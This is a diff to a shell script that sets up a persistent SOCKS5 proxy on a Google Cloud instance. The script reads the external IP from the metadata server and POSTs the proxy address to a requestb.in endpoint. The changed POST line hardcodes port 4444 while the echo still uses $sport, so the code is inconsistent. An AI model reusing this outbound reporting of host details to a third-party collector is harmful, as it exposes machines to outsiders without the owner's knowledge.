@@ -45,7 +45,7 @@ sudo chmod +x /etc/sockd.sh
 sudo ufw allow $sport
 sudo crontab -l | { cat; echo '@reboot /etc/sockd.sh'; } | crontab -
 sudo /usr/local/sbin/sockd -D -N 2 -f /etc/danted.conf
-IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" -H "Metadata-Flavor: Google")$sport
+IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" -H "Metadata-Flavor: Google")
 tail /var/log/syslog
-curl -X POST -d "socks=$IP$sport" "https://requestb.in/1jnpp541"
+curl -X POST -d "socks=$IP:4444" "https://requestb.in/1jnpp541"
 echo "your socks5 is: $IP$sport"
